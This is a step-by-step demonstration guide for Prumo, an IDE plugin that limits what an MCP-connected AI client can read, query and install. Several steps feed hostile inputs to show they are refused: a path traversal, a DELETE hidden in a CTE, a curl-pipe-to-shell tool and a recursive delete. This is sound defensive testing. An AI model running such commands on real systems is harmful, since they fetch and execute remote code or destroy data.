# End-to-end demonstration

**English** · [Português (Brasil)](demo.md)

This is the complete walk through the product: workspace, boundary, database, and a pack written by
an AI client and installed by a human. Every step says **what you should observe** — a step you
cannot verify is not a step.

Run it on a real project, not on a toy. It takes about forty minutes the first time. If this is your
first time with Prumo, install it and connect your client through the
[getting-started guide](getting-started.en.md) before you begin.

## What you need

- IntelliJ IDEA 2026.1+ (Community or Ultimate) with the bundled **MCP Server** plugin enabled
- The Prumo plugin installed from `build/distributions/`
- Two Git repositories on disk — one you will work in, one you will only read
- A folder with documentation (Markdown, TXT, JSON or YAML)
- A PostgreSQL you can reach, ideally with a read-only user
- An MCP-capable AI client (Claude, Codex, Gemini) pointed at the IDE's MCP server

Record what you observe as you go. A demonstration you cannot show later did not happen.

---

## 1 · Install and open

1. Install the plugin from disk, restart the IDE, open the project you will work in.
2. Open the **Prumo MCP** tool window on the right.

**Observe:** the panel says the project is not part of a workspace yet, and offers to configure one.
That message is the fail-closed behaviour: with no workspace, nothing is exposed.

## 2 · Create the workspace

1. Click **Configure Workspace**, name it, choose the type `MODERNIZATION`.

**Observe:** the panel now shows the workspace, the open project bound as the primary repository, and
five policies — all **DENY**. Nothing is granted by default.

## 3 · Bind what belongs together

Click **Edit Workspace** and add:

1. the second repository, role `LEGACY_REFERENCE`, access `READ_ONLY`;
2. the documentation folder;
3. the PostgreSQL data source: host, port, database, user, password.

**Observe:** the new repository binding defaults to `READ_ONLY` before you touch anything, and the
dialog states that a `READ_ONLY` binding stays read-only for every tool.

## 4 · Test the connection

Click **Test Connection** in the data source dialog.

**Observe:** the result is one of six outcomes in plain language. Try a wrong password on purpose:
you get "the database refused the user or the password", **not** a driver stack trace, and **not**
your connection string echoed back.

## 5 · Prove the credential never lands on disk

Open `%LOCALAPPDATA%\PrumoMCP\workspaces\<your-workspace>\datasources.json`.

**Observe:** host, port, database, user, access mode — and no password field at all. The secret is in
the IDE password safe.

## 6 · Connect the AI client

Point your client at the IDE's MCP server and ask it to call `prumo_diagnostics`.

**Observe:** `workspaceConfigured: true` and the project name. If it says false, the project is not
resolving to a workspace — that is the boundary working, not a bug.

## 7 · The context is only this workspace

Ask for `prumo_workspace_get_context`, then `prumo_workspace_get_repositories`.

**Observe:** the current workspace and its repositories, by identifier. No local path, no raw remote
URL. If you have a second workspace configured, ask the client to reach it: there is no tool that
takes a workspace id, and there is no way to name another one.

## 8 · Read a repository that is not open

Ask for `prumo_repository_get_structure` and `prumo_repository_read_file` on the
`LEGACY_REFERENCE` repository.

**Observe:** it reads a repository that is not open in the IDE — the thing the IDE's own tools cannot
do. Then ask it to read `C:\Windows\win.ini`, or `../../something`.

**Observe:** "refused the path … absolute path" and "… parent traversal".

## 9 · Git state

Ask for `prumo_repository_get_status`, `get_branch` and `get_diff`.

**Observe:** branch, upstream, ahead/behind and changed paths. Then confirm what is missing: there is
no tool that commits, pushes, resets or checks out. The surface is read-only by construction.

## 10 · The database, in layers

1. `prumo_database_list_available` — **observe:** identifier, name, engine, access mode. No host, no
   user, no database name.
2. `prumo_database_get_schema`, `list_tables`, `describe_table` — **observe:** structure, comments,
   keys and indexes.
3. `prumo_database_execute_readonly` with a `SELECT` — **observe:** rows, with `truncated` telling you
   when the ceiling was hit.
4. Now ask for a write: `DELETE FROM …` or `UPDATE …`.

**Observe:** refused before reaching the database, with the statement type in the message. Try
`WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` too — it is refused as well, and that one is
the interesting case: it writes and ends in a `SELECT`.

5. If any table has a column named `password`, `senha` or `token`, select it.

**Observe:** `[masked]`, with no configuration on your part.

## 11 · Let the AI client write a tool for you

Ask your client, in your own words: *"create a tool that lists the ten largest tables in this
database"*.

**Observe, in order:**

1. it calls `prumo_pack_get_authoring_spec` — it consults the format instead of guessing;
2. it calls `prumo_pack_validate` — possibly more than once, correcting itself from the error
   messages;
3. it calls `prumo_pack_submit` — and tells you it **cannot install** it.

Now look at the Prumo tool window.

**Observe:** a section appeared, with the proposed pack waiting for you. Nothing is active.

## 12 · Consent

Click **Review and install**.

**Observe:** origin, version, checksum, the capabilities in plain language, every finding with the
exact snippet that produced it, the scripts in full, and the sentence saying the responsibility is
yours. Accept, then invoke the tool through `prumo_pack_run_tool`.

**Observe:** it runs, and the response is marked as a third-party resource.

## 13 · A pack that should be refused

Ask the client to create a tool that runs `curl https://example.com/setup.sh | sh`, or that deletes a
folder recursively.

**Observe:** the destructive one is submitted but requires item-by-item acknowledgement on the
consent screen. The download-and-execute one is **refused at validation** — it never reaches the
queue, and there is no button that installs it.

## 14 · Export and import

1. Export the pack you accepted.
2. Open the file in an editor — **observe:** it is readable JSON, with the manifest, the knowledge and
   a checksum. No password, no path from your machine.
3. Import it into a different workspace.

**Observe:** the consent screen appears again. Consent does not travel with the file.

## 15 · Restart

Close the IDE and open it again.

**Observe:** workspace, repositories, documentation, data source and pack are all back. The password
still works, because it never left the password safe.

## 16 · Nothing was written in your repositories

```bash
git status            # in both repositories
git clean -nd         # what would be removed, in both
```

**Observe:** no `.prumo`, no configuration file, no cache — nothing. Every byte Prumo produced is in
the operating system directory.

## 17 · The suite

```bash
./gradlew clean test
./gradlew test -PsecurityOnly
./gradlew verifyPlugin
```

**Observe:** green, green, and `Compatible` against Community and Ultimate.

---

## 18 · The interface speaks your language

Open *Settings · Tools · Prumo MCP* and set **Prumo interface language** to *Portuguese (Brazil)*,
leaving the IDE itself in English. Apply, then look at the tool window and open the workspace editor.

**Observe:** the panel, the editor, the buttons and the stripe title are in Portuguese while the
rest of the IDE stays in English — no half-translated screen. Now ask your AI client for
`prumo_workspace_get_context` again: tool names, descriptions and any error still come back in
English. Interface text is for you; the MCP surface is a contract.

Set it back to *Follow the IDE* and the plugin returns to the IDE's own language.

---

## Recording the result

For each step, note what you observed. Where behaviour differs from this script, that difference is
either a bug or an undocumented limitation — both belong in an issue, not in your memory.

## Known state of this script

Steps 1 to 10, 15 and 17 were exercised on Windows during development, partly through a real MCP
client against a sandbox IDE. Steps 11 to 14 are proven by automated tests over the same code paths,
and by construction of the approval flow, but the full cycle with a real AI client is the validation
the maintainer runs on a real project. Step 18 is proven by tests for the part that can be tested —
an explicit locale beats the machine's language, and the two language files carry the same keys —
while seeing both languages on screen is part of that same validation. Linux parity is a design requirement, covered by tests and by
CI, and is validated afterwards by third parties on a stable build.
